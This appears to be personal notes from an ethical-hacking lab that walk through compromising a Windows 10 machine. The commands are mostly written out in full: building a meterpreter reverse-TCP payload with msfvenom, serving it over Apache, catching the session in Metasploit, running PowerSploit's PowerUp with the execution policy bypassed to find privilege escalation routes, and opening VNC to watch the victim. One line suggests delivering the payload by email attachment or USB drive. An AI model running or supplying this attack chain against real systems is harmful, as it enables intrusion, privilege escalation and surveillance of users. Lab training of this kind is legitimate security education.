- Attackers use client-side vulnerabilities to gain access to the target machine. VNC (Virtual Network Computing) enables an attacker to remotely access and control the targeted computers using another computer or mobile device from anywhere in the world. At the same time, VNC is also used by network administrators and organizations throughout every industry sector for a range of different scenarios and uses, including providing IT desktop support to colleagues and friends and accessing systems and services on the move.
- This lab demonstrates the exploitation procedure enforced on a weakly patched Windows 10 machine that allows you to gain remote access to it through a remote desktop connection.

- Open terminal
	> msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=#HOST IP address LPORT=444 -o /root/Desktop/Test.exe
	
	- This will generate **Test.exe**, a malicious file at the location **/root/Desktop**
	- Now, create a directory to share this file with the target machine, provide the permissions, and copy the file from **Desktop** to the shared location using the below commands:
		> mkdir /var/www/html/share
		> chmod -R 755 /var/www/html/share
		> chown -R www-data:www-data /var/www/html/share
		> (copy malicious file to above location)
		> cp /root/Desktop/Test.exe /var/www/html/share
		
		- **Here, we are sending the malicious payload through a shared directory; but in real-time, you can send it via an attachment in an email or through physical means such as a hard drive or pen drive.**
	- Now, start the apache service. To do this, type **service apache2 start** and press **Enter**.
		> service apache2 start
		> msfconsole (to start metasploit framework)
		> use exploit/multi/handler
		> set payload windows/meterpreter/reverse_tcp
		> set LHOST #hostip
		> set LPORT 444
		> exploit
		
		- now navigate to http://#hostip/share
		- click Text.exe to download it and open it
		- Back to linux machine, we see that meterpreter shell has opened a session
		- Type **sysinfo** and press **Enter** to verify that you have hacked the targeted **Windows 10**.
			> upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1
			
			- This command uploads the PowerSploit file (**PowerUp.ps1**) to the target system’s present working directory.
			- PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.
			> shell
			
			- to open a shell session. Observe that the present working directory points to the **Downloads** folder in the target system.
			> powershell -ExecutionPolicy Bypass -command ". .\PowerUp.ps1;Invoke-AllChecks" (to run the PowerUp.ns1 file)

			- A result appears, displaying **Check** and **AbuseFunction**.
			- Attackers exploit misconfigured services such as unquoted service paths, service object permissions, unattended installs, modifiable registry autoruns and configurations, and other locations to elevate access privileges. After establishing an active session using Metasploit, attackers use tools such as PowerSploit to detect misconfigured services that exist in the target OS.
			> exit 
			> to revert back to meterpreter session

			- Now, exploit VNC vulnerability to gain remote access to the **Windows 10** machine. To do so, type **run vnc** and press **Enter**.
				> run vnc

					- This will open a VNC session for the target machine. Using this session, you can see the victim’s activities on the system, including the files, websites, software, and other resources the user opens or runs.